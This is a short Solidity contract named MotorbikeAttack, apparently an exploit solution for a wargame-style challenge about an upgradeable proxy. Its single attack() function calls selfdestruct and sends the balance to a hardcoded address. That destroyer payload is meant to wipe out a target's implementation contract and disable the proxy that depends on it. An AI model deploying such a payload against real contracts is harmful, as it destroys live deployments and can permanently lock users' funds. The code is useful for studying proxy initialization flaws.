// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract MotorbikeAttack {
    constructor () {}

    function attack() external {
         selfdestruct(payable(0x513417e1393a08b6E9D882cafE191086F131d7E1));
    }
}